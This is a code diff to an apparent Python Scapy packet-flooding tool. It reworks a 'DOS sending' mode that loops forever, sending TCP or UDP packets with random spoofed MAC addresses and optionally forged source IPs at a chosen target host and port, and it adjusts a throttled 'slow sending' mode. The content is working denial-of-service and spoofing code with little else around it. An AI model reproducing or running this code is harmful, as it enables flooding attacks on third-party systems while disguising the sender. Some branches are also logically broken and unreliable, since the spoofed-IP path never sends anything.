@@ -103,7 +103,7 @@ if dos == "":
     dos=str(input())
     dos=dos.upper()
 
-if slow == "":
+if slow == "" and dos != "YES":
     print ("Slow sending?: [YES] or [NO] : ")
     slow=str(input())
     slow=slow.upper()
@@ -141,38 +141,49 @@ else:
 # DOS sending...
 if dos =="YES":
     while True:
-        if macspoof == "YES" and prot == "TCP":
+        if macspoof == "YES":
             mac=macspoofer()
             etherframe=Ether(src=mac)
             if ipspoof == "YES":
                 iphdr=IP(src=ipspoofer(),dst=dstip)
-            srcport=random.randrange(1025,65535)
-            tcp=TCP(sport=srcport,dport=port,flags=flag)
-            packet=etherframe/iphdr/tcp/data
-            sendp(packet, iface=interface)
-        else:
-            mac=macspoofer()
-            etherframe=Ether(src=mac)
-            srcport=random.randrange(1025,65535)
-            udp=UDP(sport=srcport,dport=port)
-            packet=etherframe/iphdr/udp/data
-            sendp(packet, iface=interface)
-else:
-    if slow == "YES":
-        while True:
+            elif prot == "TCP":
+                srcport=random.randrange(1025,65535)
+                tcp=TCP(sport=srcport,dport=port,flags=flag)
+                packet=etherframe/iphdr/tcp/data
+                sendp(packet, iface=interface)
+            elif prot == "UDP":
+                srcport=random.randrange(1025,65535)
+                udp=UDP(sport=srcport,dport=port)
+                packet=etherframe/iphdr/udp/data
+                sendp(packet, iface=interface)
+        elif macspoof == "NO":
             if ipspoof == "YES":
                 iphdr=IP(src=ipspoofer(),dst=dstip)
-            elif prot=="TCP":
+            elif prot == "TCP":
                 srcport=random.randrange(1025,65535)
                 tcp=TCP(sport=srcport,dport=port,flags=flag)
                 packet=iphdr/tcp/data
-            elif prot =="UDP":
+                send(packet)
+            elif prot == "UDP":
                 srcport=random.randrange(1025,65535)
                 udp=UDP(sport=srcport,dport=port)
                 packet=iphdr/udp/data
+                send(packet)
+if slow == "YES":
+    while True:
+        if ipspoof == "YES":
+            iphdr=IP(src=ipspoofer(),dst=dstip)
+        elif prot=="TCP":
+            srcport=random.randrange(1025,65535)
+            tcp=TCP(sport=srcport,dport=port,flags=flag)
+            packet=iphdr/tcp/data
+        elif prot =="UDP":
+            srcport=random.randrange(1025,65535)
+            udp=UDP(sport=srcport,dport=port)
+            packet=iphdr/udp/data
 
-            s.send(packet)
-            time.sleep(1)
+        s.send(packet)
+        time.sleep(1)
 
 
 s.send(packet)
